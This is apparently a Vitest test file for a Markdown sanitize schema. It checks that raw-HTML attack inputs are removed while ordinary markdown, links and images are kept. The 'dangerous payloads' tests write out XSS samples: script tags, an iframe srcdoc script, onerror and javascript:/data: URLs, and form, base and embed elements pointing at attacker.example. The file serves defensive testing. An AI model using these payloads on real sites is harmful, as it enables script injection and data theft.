import { describe, expect, it } from "vitest";
import { unified } from "unified";
import remarkParse from "remark-parse";
import remarkGfm from "remark-gfm";
import remarkRehype from "remark-rehype";
import rehypeRaw from "rehype-raw";
import rehypeSanitize from "rehype-sanitize";
import rehypeStringify from "rehype-stringify";
import { markdownSanitizeSchema } from "./sanitize-schema";

/**
 * Runs the same parse + raw-HTML + sanitize pipeline that ReactMarkdown
 * sets up at every render site, then stringifies the HAST tree so we can
 * assert on the post-sanitize output.
 */
async function render(markdown: string): Promise<string> {
  const file = await unified()
    .use(remarkParse)
    .use(remarkGfm)
    .use(remarkRehype, { allowDangerousHtml: true })
    .use(rehypeRaw)
    .use(rehypeSanitize, markdownSanitizeSchema)
    .use(rehypeStringify, { allowDangerousHtml: true })
    .process(markdown);
  return String(file);
}

describe("markdownSanitizeSchema — dangerous payloads", () => {
  it("strips <iframe srcdoc=...> (the headline finding 3.1 vector)", async () => {
    const html = await render(
      '<iframe srcdoc="<script>window.top.fileService.listAll(`users`)</script>"></iframe>',
    );
    expect(html).not.toMatch(/iframe/i);
    expect(html).not.toMatch(/srcdoc/i);
    expect(html).not.toMatch(/<script/i);
  });

  it("strips <iframe src=https://attacker.example>", async () => {
    const html = await render('<iframe src="https://attacker.example"></iframe>');
    expect(html).not.toMatch(/iframe/i);
    expect(html).not.toMatch(/attacker\.example/);
  });

  it("strips <script>alert(1)</script>", async () => {
    const html = await render("<script>alert(1)</script>");
    expect(html).not.toMatch(/<script/i);
    expect(html).not.toMatch(/alert\(1\)/);
  });

  it("strips onerror handler on <img>", async () => {
    const html = await render('<img src="x" onerror="evil()" alt="bad">');
    expect(html).toMatch(/<img/);
    expect(html).not.toMatch(/onerror/i);
    expect(html).not.toMatch(/evil\(\)/);
  });

  it("strips javascript: href on <a>", async () => {
    const html = await render('<a href="javascript:alert(1)">click</a>');
    expect(html).not.toMatch(/javascript:/i);
    expect(html).not.toMatch(/alert\(1\)/);
    expect(html).toMatch(/click/);
  });

  it("strips <form action=https://attacker.example>", async () => {
    const html = await render(
      '<form action="https://attacker.example" method="POST"><input name="csrf"></form>',
    );
    expect(html).not.toMatch(/<form/i);
    expect(html).not.toMatch(/attacker\.example/);
  });

  it("strips inline style attribute", async () => {
    const html = await render('<p style="background:url(\'javascript:alert(1)\')">hi</p>');
    expect(html).toMatch(/<p>hi<\/p>/);
    expect(html).not.toMatch(/style=/i);
  });

  it("strips <object> and <embed>", async () => {
    const oHtml = await render('<object data="https://attacker.example"></object>');
    const eHtml = await render('<embed src="https://attacker.example">');
    expect(oHtml).not.toMatch(/<object/i);
    expect(eHtml).not.toMatch(/<embed/i);
  });

  it("strips <base href> (would otherwise repoint relative URLs)", async () => {
    const html = await render('<base href="https://attacker.example/">');
    expect(html).not.toMatch(/<base/i);
  });

  it("strips data: URL on <a href>", async () => {
    const html = await render(
      '<a href="data:text/html,<script>alert(1)</script>">click</a>',
    );
    expect(html).not.toMatch(/data:/i);
    expect(html).not.toMatch(/<script/i);
    expect(html).toMatch(/click/);
  });
});

describe("markdownSanitizeSchema — preserved surface", () => {
  it("keeps a normal https <a href>", async () => {
    const html = await render('<a href="https://example.com">x</a>');
    expect(html).toMatch(/href="https:\/\/example\.com"/);
    expect(html).toMatch(/>x</);
  });

  it("keeps mailto: and tel: links", async () => {
    const mailto = await render('<a href="mailto:user@example.com">mail</a>');
    const tel = await render('<a href="tel:+15555550100">call</a>');
    expect(mailto).toMatch(/href="mailto:/);
    expect(tel).toMatch(/href="tel:/);
  });

  it("keeps <img src=https://...> with alt", async () => {
    const html = await render('<img src="https://example.com/x.png" alt="x">');
    expect(html).toMatch(/<img/);
    expect(html).toMatch(/src="https:\/\/example\.com\/x\.png"/);
    expect(html).toMatch(/alt="x"/);
  });

  it("keeps HTML comments (stamp-utils.ts <!-- stamp:start --> markers)", async () => {
    const html = await render(
      "# Header\n\n<!-- stamp:start -->\nlast updated: 2026-05-15\n<!-- stamp:end -->\n",
    );
    expect(html).toMatch(/<!--\s*stamp:start\s*-->/);
    expect(html).toMatch(/<!--\s*stamp:end\s*-->/);
  });

  it("keeps standard markdown: headings, lists, GFM strikethrough, tables, code", async () => {
    const html = await render(
      [
        "# H1",
        "## H2",
        "",
        "- item 1",
        "- item 2",
        "",
        "~~strike~~",
        "",
        "| a | b |",
        "| - | - |",
        "| 1 | 2 |",
        "",
        "```js",
        "const x = 1;",
        "```",
      ].join("\n"),
    );
    expect(html).toMatch(/<h1>/);
    expect(html).toMatch(/<h2>/);
    expect(html).toMatch(/<ul>/);
    expect(html).toMatch(/<del>strike<\/del>/);
    expect(html).toMatch(/<table>/);
    expect(html).toMatch(/<code/);
  });

  it("keeps GFM task list checkboxes (defaultSchema allows them)", async () => {
    const html = await render("- [x] done\n- [ ] todo");
    expect(html).toMatch(/<input/);
    expect(html).toMatch(/type="checkbox"/);
  });
});
